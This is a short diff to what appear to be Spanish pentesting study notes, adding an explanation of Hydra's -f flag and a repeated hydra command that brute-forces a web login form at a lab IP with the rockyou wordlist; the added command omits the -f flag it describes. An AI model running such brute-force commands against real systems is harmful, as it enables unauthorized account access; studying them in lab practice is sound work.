@@ -44,6 +44,9 @@ Ejemplos hay que practicar
 
  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.106 -s 5000 -v http-post-form "/login/:user=^USER^&password=^PASS^:Invalid Password"
 
+-f: Este parámetro le dice a Hydra que finalice el ataque después de que se encuentre la primera contraseña válida.
+
+ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.106 -s 5000 -v http-post-form "/login/:user=^USER^&password=^PASS^:Invalid Password"
 ```
 
 basic auth
